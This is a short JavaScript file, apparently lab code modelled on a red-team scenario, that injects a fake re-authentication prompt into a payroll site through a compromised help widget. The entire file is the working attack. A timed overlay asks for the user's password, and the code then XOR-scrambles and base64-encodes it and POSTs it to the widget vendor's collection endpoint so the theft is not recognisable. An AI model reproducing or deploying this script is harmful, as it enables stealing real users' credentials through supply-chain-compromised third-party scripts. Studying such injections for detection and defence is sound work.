// Lab attack, modelled on red-team scenario e14: a help/chat widget on a genuine payroll
// site, whose vendor was hacked, asks for the password again a second after load.
// Drawn with innerHTML on an element already in the page.
// Reads the password, closes the prompt, then sends it scrambled (XOR + base64) to the
// widget vendor's own server, so the send itself is not recognisable.
function steal(value, shade) {
  shade.remove();
  var out = "";
  for (var i = 0; i < value.length; i++) out += String.fromCharCode(value.charCodeAt(i) ^ 23);
  setTimeout(function () {
    fetch("http://helpwidget.localhost:8765/collect", {method: "POST", body: btoa(out)});
  }, 300);
}
window.addEventListener("load", function () {
  setTimeout(function () {
    var shade = document.createElement("div");
    shade.id = "reauth";
    shade.style.cssText = "position:fixed;inset:0;background:#0007;display:flex;align-items:center;justify-content:center";
    document.body.appendChild(shade);
    shade.innerHTML = '<div style="background:#fff;padding:24px;border-radius:10px;width:320px;font:15px system-ui">' +
      '<p>For your security, confirm your password to view pay statements.</p>' +
      '<input type="password" id="rp"><button id="rp-go">Continue</button></div>';
    document.getElementById("rp-go").onclick = function () { steal(document.getElementById("rp").value, shade); };
  }, 1000);
});
